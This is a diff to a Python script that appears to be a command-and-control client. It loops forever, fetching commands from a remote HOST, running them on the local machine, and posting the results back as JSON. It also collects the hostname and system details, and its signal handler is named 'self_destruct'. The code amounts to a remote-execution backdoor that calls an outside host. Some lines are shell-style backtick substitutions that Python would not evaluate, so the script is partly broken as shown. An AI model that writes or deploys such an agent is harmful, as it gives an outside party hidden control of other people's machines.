@@ -1,12 +1,13 @@
 #!`which python`
 
 
+import subprocess
 import requests
+import signal
 import time
 import json
-import subprocess
 import sys
-import signal
+import os
 
 session=requests.session()
 
@@ -16,10 +17,6 @@ def self_destruct(signum, frame):
     exit(0)
 
 signal.signal(signal.SIGINT, self_destruct)
-signal.signal(signal.SIGABRT, self_destruct)
-signal.signal(signal.SIGSTOP, self_destruct)
-signal.signal(signal.SIGKILL, self_destruct)
-
 
 CLIENTNAME="`hostname`"
 UNAME="`uname -a`"
@@ -41,12 +38,19 @@ while True:
     }).text)
 
     response={
-        commandid: do_cmd(command)
-        for commandid, command in control
+        'clientid': CLIENTID,
+        'report': {
+            commandid: do_cmd(command)
+            for commandid, command in control
+        }
     }
 
     if len(response) > 0:
-        session.post('http://'+HOST+'/client/submit_pending', data=response)
+        session.post(
+            'http://'+HOST+'/client/submit_pending',
+            data=json.dumps(response),
+            headers={'content-type':'application/json'}
+        )
     
     time.sleep(10)
     
